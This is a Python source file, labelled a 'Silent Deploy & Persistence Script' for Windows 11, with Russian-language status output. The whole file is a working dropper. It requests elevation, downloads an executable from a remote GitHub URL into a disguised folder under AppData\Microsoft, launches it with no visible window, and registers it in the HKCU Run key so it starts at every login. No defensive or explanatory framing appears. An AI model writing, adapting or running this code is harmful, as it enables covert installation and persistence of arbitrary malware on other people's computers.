import os
import sys
import shutil
import subprocess
import logging
import urllib.request
import ctypes
import winreg
from pathlib import Path

# ============================================================
#  Silent Deploy & Persistence Script
#  Target: Windows 11
#  Python 3.10+
# ============================================================

# --- Configuration ---
URL = "https://github.com/s1cr3TtT/test/raw/main/ZCode-3.1.2-win-x64.exe"
APP_NAME = "ZCodeService"
HIDDEN_DIR = Path(os.getenv("APPDATA")) / "Microsoft" / "CLR"
HIDDEN_FILE = HIDDEN_DIR / f"{APP_NAME}.exe"
REG_PATH = r"Software\Microsoft\Windows\CurrentVersion\Run"

# --- Logging Setup ---
logging.basicConfig(
    level=logging.INFO,
    format="%(message)s",
    handlers=[logging.StreamHandler(sys.stdout)]
)
log = logging.getLogger("deploy")


def is_admin() -> bool:
    try:
        return bool(ctypes.windll.shell32.IsUserAnAdmin())
    except Exception:
        return False


def elevate():
    if not is_admin():
        try:
            ctypes.windll.shell32.ShellExecuteW(
                None, "runas", sys.executable, " ".join(sys.argv), None, 0
            )
            sys.exit(0)
        except Exception:
            pass


def download_payload(url: str, dest: Path) -> tuple[bool, str]:
    try:
        HIDDEN_DIR.mkdir(parents=True, exist_ok=True)
        req = urllib.request.Request(
            url,
            headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64)"}
        )
        with urllib.request.urlopen(req, timeout=30) as resp, open(dest, "wb") as f:
            shutil.copyfileobj(resp, f)
        if dest.stat().st_size > 0:
            return True, "Файл загружен"
        return False, "Размер файла 0 байт"
    except Exception as e:
        return False, str(e)


def execute_payload(dest: Path) -> tuple[bool, str]:
    try:
        subprocess.Popen(
            [str(dest)],
            creationflags=subprocess.CREATE_NO_WINDOW | subprocess.DETACHED_PROCESS,
            close_fds=True
        )
        return True, "Процесс запущен скрытно"
    except Exception as e:
        return False, str(e)


def add_to_startup(dest: Path) -> tuple[bool, str]:
    try:
        with winreg.OpenKey(
            winreg.HKEY_CURRENT_USER, REG_PATH, 0, winreg.KEY_SET_VALUE
        ) as key:
            winreg.SetValueEx(key, APP_NAME, 0, winreg.REG_SZ, str(dest))
        return True, "Запись добавлена в HKCU Run"
    except Exception as e:
        return False, str(e)


# --- Main ---
if __name__ == "__main__":
    elevate()

    results = {"download": None, "execute": None, "startup": None}

    # 1. Download
    ok, reason = download_payload(URL, HIDDEN_FILE)
    results["download"] = (ok, reason)

    # 2. Execute
    if ok:
        ok2, reason2 = execute_payload(HIDDEN_FILE)
        results["execute"] = (ok2, reason2)
    else:
        results["execute"] = (False, "Пропуск: скачивание не удалось")

    # 3. Persistence
    ok3, reason3 = add_to_startup(HIDDEN_FILE)
    results["startup"] = (ok3, reason3)

    # --- Output ---
    print("\n" + "=" * 50)
    for action, label in [
        ("download",   "Скачивание"),
        ("execute",    "Запуск"),
        ("startup",    "Автозагрузка"),
    ]:
        success, msg = results[action]
        status = "Успешно" if success else "Провал"
        print(f"{label}: {status} | Причина: {msg}")
    print("=" * 50)
